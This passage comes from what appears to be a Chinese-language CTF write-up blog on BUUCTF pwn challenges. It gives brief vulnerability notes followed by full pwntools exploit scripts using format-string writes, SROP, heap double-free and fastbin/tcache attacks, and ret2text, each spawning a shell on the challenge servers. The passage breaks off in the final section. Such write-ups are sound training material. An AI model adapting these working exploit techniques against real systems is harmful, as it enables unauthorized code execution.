- 0x118</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">sigframe.rsi = 0</span><br><span class="line">sigframe.rdx = 0</span><br><span class="line">payload = offset * "a" + p64(mov_rax_ret) + p64(syscall_ret) + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line">log.success("stack_addr: " + hex(stack_addr))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20154,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x24-ciscn-2019-nw-6"><a href="#0x24-ciscn-2019-nw-6" class="headerlink" title="0x24 ciscn_2019_nw_6"></a>0x24 ciscn_2019_nw_6</h2><h3 id="程序没有任何保护，考虑shellcode"><a href="#程序没有任何保护，考虑shellcode" class="headerlink" title="程序没有任何保护，考虑shellcode"></a>程序没有任何保护，考虑shellcode</h3><h3 id="利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"><a href="#利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去" class="headerlink" title="利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"></a>利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_nw_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_nw_6")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">#0804A160</span><br><span class="line">#leak ebp</span><br><span class="line">sh.recv()</span><br><span class="line">payload = "%12$p"</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">ebp = int(sh.recv(8),16)</span><br><span class="line">ret_addr = ebp + 0xc - 6*0x4</span><br><span class="line"></span><br><span class="line">payload = "%." + str(ret_addr % 0x10000) + "d%23$hn"</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">payload = "%." + str(0xA170) + "d%59$hn"</span><br><span class="line">payload = payload.ljust(4*4,"\x00")</span><br><span class="line">payload += asm(shellcraft.i386.sh())</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("hello")</span><br><span class="line">log.success("ebp: " + hex(ebp))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20151,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x25-judgement-mna-2016"><a href="#0x25-judgement-mna-2016" class="headerlink" title="0x25 judgement_mna_2016"></a>0x25 judgement_mna_2016</h2><h3 id="导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本"><a href="#导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本" class="headerlink" title="导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本"></a>导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("judgement_mna_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./judgement_mna_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">payload = "%28$s"</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20077,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x26-ciscn-nw-4"><a href="#0x26-ciscn-nw-4" class="headerlink" title="0x26 ciscn_nw_4"></a>0x26 ciscn_nw_4</h2><h3 id="1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc"><a href="#1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc" class="headerlink" title="1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc"></a>1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc</h3><h3 id="2、通过fastbin-attack修改unsorted-bin’s-bk，在free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可"><a href="#2、通过fastbin-attack修改unsorted-bin’s-bk，在free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可" class="headerlink" title="2、通过fastbin attack修改unsorted bin’s bk，在free_hook处伪造fake_chunk，然后再用double free fastbin attack修改free_hook的值为system，然后释放content为/bin/sh\x00的chunk即可"></a>2、通过fastbin attack修改unsorted bin’s bk，在<strong>free_hook处伪造fake_chunk，然后再用double free fastbin attack修改</strong>free_hook的值为system，然后释放content为/bin/sh\x00的chunk即可</h3><h3 id="最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"><a href="#最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃" class="headerlink" title="最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub rsp,0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"></a>最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在<code>sub rsp,0xNNN</code>，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_nw_4")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def inputName(name):</span><br><span class="line">sh.recvuntil("what is your name?")</span><br><span class="line">sh.send(name)</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("size?")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("content?")</span><br><span class="line">sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("index ?")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("index ?\n")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_nw_4")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">main_arena_offset = 0x3C4B20</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">main_arena_offset = 0x3C4B20</span><br><span class="line">inputName("fuck")</span><br><span class="line">#leak libc</span><br><span class="line">add(0x80,"\x11"*0x80) #idx 0</span><br><span class="line">add(0x18,"\x12"*0x18) #idx 1</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 88</span><br><span class="line">libc = main_arena - main_arena_offset</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">execl = libc + lib.symbols['execl']</span><br><span class="line">execve = libc + lib.symbols['execve']</span><br><span class="line">add(0x80,"\x13"*0x80) #idx 2 junk chunk</span><br><span class="line"></span><br><span class="line">#leak heap base</span><br><span class="line">payload = p64(0)*11 + p64(0x71)</span><br><span class="line">add(0x60,"\x14"*0x60) #idx 3</span><br><span class="line">add(0x60,payload) #idx 4</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">free(4)</span><br><span class="line">show(4)</span><br><span class="line">heap_base = (u64(sh.recvuntil("\x0a\x2d\x2d",True).ljust(8,"\x00")) >> 16) << 8</span><br><span class="line"></span><br><span class="line">#modify unsorted bin's bk</span><br><span class="line">unsorted_bin_attack_addr = main_arena - (0x7f7506f49b20 - 0x7f7506f4b768) - 0x8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80,"\x16"*0x80) #idx 5</span><br><span class="line">add(0x18,"$0\x00") #idx 6</span><br><span class="line"></span><br><span class="line">free(5)</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">add(0x60,p64(heap_base + 0x180)) #idx 7</span><br><span class="line">add(0x60,p64(heap_base + 0x180)) #idx 8</span><br><span class="line">add(0x60,p64(heap_base + 0x180)) #idx 9</span><br><span class="line"></span><br><span class="line">#fastbin attack</span><br><span class="line">payload = p64(0) + p64(0x91) + p64(main_arena + 88) + p64(unsorted_bin_attack_addr)</span><br><span class="line">add(0x60,payload)#idx 10</span><br><span class="line"></span><br><span class="line">add(0x80,p64(0xdeadbeef))#idx 11</span><br><span class="line"></span><br><span class="line">free(7)</span><br><span class="line">free(8)</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">#fastbin attack modify __free_hook</span><br><span class="line">add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 12</span><br><span class="line">add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 13</span><br><span class="line">add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 14</span><br><span class="line"></span><br><span class="line">payload  = "\x00"*3 + p64(0) * 5 + p64(execve)</span><br><span class="line">add(0x60,payload)</span><br><span class="line">#input()</span><br><span class="line">free(6)</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("unsorted_bin_attack_addr: " + hex(unsorted_bin_attack_addr))</span><br><span class="line">log.success("execl: " + hex(execl))</span><br><span class="line">#x/50gx (long long)(&main_arena) - 0x1b</span><br><span class="line">#x/50gx (long long)(&__free_hook) - 0x50</span><br><span class="line">#execl  execlexecle</span><br><span class="line">#x/50gx *0x6020C0</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">#buuoj.cn 20149</span><br><span class="line">pwn("buuoj.cn",20149,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x27-checker-seccon-2016"><a href="#0x27-checker-seccon-2016" class="headerlink" title="0x27 checker_seccon_2016"></a>0x27 checker_seccon_2016</h2><h3 id="首先这题开启了canary，且代码无法leak-canary，导致无法溢出"><a href="#首先这题开启了canary，且代码无法leak-canary，导致无法溢出" class="headerlink" title="首先这题开启了canary，且代码无法leak canary，导致无法溢出"></a>首先这题开启了canary，且代码无法leak canary，导致无法溢出</h3><h3 id="考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据"><a href="#考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据" class="headerlink" title="考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据"></a>考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据</h3><h3 id="由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60"><a href="#由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60" class="headerlink" title="由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60"></a>由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60</h3><h3 id="如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可"><a href="#如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可" class="headerlink" title="如何找到argv[0]，只需调试器附加运行的程序，然后找到./文件名的字符串即可，比如我这里是./checker_seccon_2016，然后将flag的地址覆盖进去即可"></a>如何找到argv[0]，只需调试器附加运行的程序，然后找到<code>./文件名</code>的字符串即可，比如我这里是<code>./checker_seccon_2016</code>，然后将flag的地址覆盖进去即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("checker_seccon_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./checker_seccon_2016")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.recvuntil("Hello! What is your name?\nNAME : ")</span><br><span class="line">sh.sendline("fuckyou")</span><br><span class="line">sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">payload  = "\xaa" * 376</span><br><span class="line">payload += "\xc0\x10\x60"</span><br><span class="line">sh.sendline(payload+"\x11\x11\x11")</span><br><span class="line">sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">sh.sendline(payload+"\x11\x11")</span><br><span class="line">sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">sh.sendline(payload+"\x11")</span><br><span class="line">sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">sh.sendline("yes")</span><br><span class="line">sh.recvuntil("\nOh, Really??\nPlease tell me the flag!\nFLAG : ")</span><br><span class="line">sh.sendline("fuckyou")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20066,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x28-ciscn-2019-ne-5"><a href="#0x28-ciscn-2019-ne-5" class="headerlink" title="0x28 ciscn_2019_ne_5"></a>0x28 ciscn_2019_ne_5</h2><h3 id="典型的ROP题，ret2text"><a href="#典型的ROP题，ret2text" class="headerlink" title="典型的ROP题，ret2text"></a>典型的ROP题，ret2text</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_ne_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_ne_5")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline('administrator')</span><br><span class="line">sh.recvuntil('0.Exit\n:')</span><br><span class="line">offset = 76</span><br><span class="line">binsh = 0x080482E6 + 0x4</span><br><span class="line">sh.sendline("1")</span><br><span class="line">payload = offset * 'a' + p32(elf.plt['system']) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">sh.recvuntil('Please input new log info:')</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("0.Exit\n:")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20171,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x29-ciscn-2019-es-2"><a href="#0x29-ciscn-2019-es-2" class="headerlink" title="0x29 ciscn_2019_es_2"></a>0x29 ciscn_2019_es_2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("ciscn_s_4")</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_s_4")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop3_ret = 0x08048699</span><br><span class="line">pop2_ret = 0x0804869a</span><br><span class="line">offset = 44</span><br><span class="line">main_addr = 0x080485FF</span><br><span class="line">payload = (offset-12) * 'a' + p32(0x0804A01C) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">payload = (offset-0x10) * "b"+"5"*4 +p32(0x0804A01C)+"7"*4+"8"*4 +p32(0x0804861D)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">sh.recv(33-4-4)</span><br><span class="line">libc = u32(sh.recv(4)) - lib.symbols["__libc_start_main"]</span><br><span class="line">log.success("libc :" + hex(libc))</span><br><span class="line">system = 0x08048559</span><br><span class="line">binsh = libc + next(lib.search("/bin/sh"))</span><br><span class="line">log.success("binsh :"+hex(binsh))</span><br><span class="line">log.success("system :"+hex(libc + lib.symbols['system']))</span><br><span class="line">#input()</span><br><span class="line">payload = (offset)*"a" + p32(0x08048450)</span><br><span class="line">sh.send(payload)</span><br><span class="line">payload = (offset-12) * 'a' + p32(binsh) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">payload = (offset-0x10) * "b"+"5"*4 +p32(binsh)+"7"*4+"8"*4 +p32(system)</span><br><span class="line">sh.send(payload)</span><br><span class="line">#sh.recvuntil("Hello, ")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20174,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x30-ciscn-2019-final-3"><a href="#0x30-ciscn-2019-final-3" class="headerlink" title="0x30 ciscn_2019_final_3"></a>0x30 ciscn_2019_final_3</h2><h3 id="这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell"><a href="#这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell" class="headerlink" title="这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell"></a>这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell</h3><h3 id="简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell"><a href="#简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell" class="headerlink" title="简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell"></a>简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 